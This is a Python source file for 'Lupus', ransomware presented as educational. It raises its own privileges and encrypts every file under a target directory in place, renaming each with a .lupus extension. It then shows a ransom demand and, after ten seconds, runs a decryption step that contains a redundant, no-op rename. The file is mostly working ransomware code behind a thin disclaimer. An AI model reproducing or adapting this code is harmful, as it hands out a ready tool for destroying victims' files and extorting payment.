"""
Lupus - A ransomeware virus for educational purposes only.
Author: Zack Allen
Date: October 2025
Disclaimer: This code is for educational purposes only. Unauthorised use or distribution of this code is prohibited.
Version: 1.0
"""

import os
import sys
import time
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
from elevate import elevate

elevate()

# Generate a key for encryption and decryption
def generate_key():
    return Fernet.generate_key()

key = generate_key()
fernet = Fernet(key)
encrypted_files = []

ignore_files = ['lupus.py', 'key.key', 'README.md']

# Encrypt and decrypt functions
def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
    encrypted_files.append(file_path + '.lupus')
    os.rename(file_path, file_path + '.lupus')
    
def decrypt_file(file_path):
    with open(file_path, 'rb') as encrypted_file:
        encrypted = encrypted_file.read()
    decrypted = fernet.decrypt(encrypted)
    with open(file_path[:-6], 'wb') as decrypted_file:
        decrypted_file.write(decrypted)
    os.remove(file_path)
    encrypted_files.remove(file_path)
    os.rename(file_path[:-6], file_path[:-6])
    
# Encrypt all files in the given directory
def encrypt_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file not in ignore_files and not file.endswith('.lupus'):
                try:
                    encrypt_file(os.path.join(root, file))
                except Exception as e:
                    print(f"Failed to encrypt {file}: {e}")
    show_ransom_note()

# Show ransom note using tkinter
def show_ransom_note():
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Ransomware Notice", "Your files have been encrypted. To recover them, please pay the ransom.")
    root.destroy()
    
# Decrypt all files after ransom is paid (for educational purposes)
def decrypt_all_files():
    for file in encrypted_files[:]:
        try:
            decrypt_file(file)
        except Exception as e:
            print(f"Failed to decrypt {file}: {e}")
    messagebox.showinfo("Decryption Complete", "All files have been decrypted.")
    sys.exit()
    
# Main function to run the ransomware simulation
def main():
    if len(sys.argv) != 2:
        print("Usage: python lupus.py <directory_to_encrypt>")
        sys.exit(1)
    
    target_directory = sys.argv[1]
    
    if not os.path.isdir(target_directory):
        print("The specified path is not a directory.")
        sys.exit(1)
    
    encrypt_directory(target_directory)
    
    # Simulate waiting for ransom payment
    time.sleep(10)  # In a real scenario, this would be indefinite until payment is made
    
    # For educational purposes, we will decrypt the files after the wait
    decrypt_all_files()
    
# Run the main function
if __name__ == "__main__":
    main()
    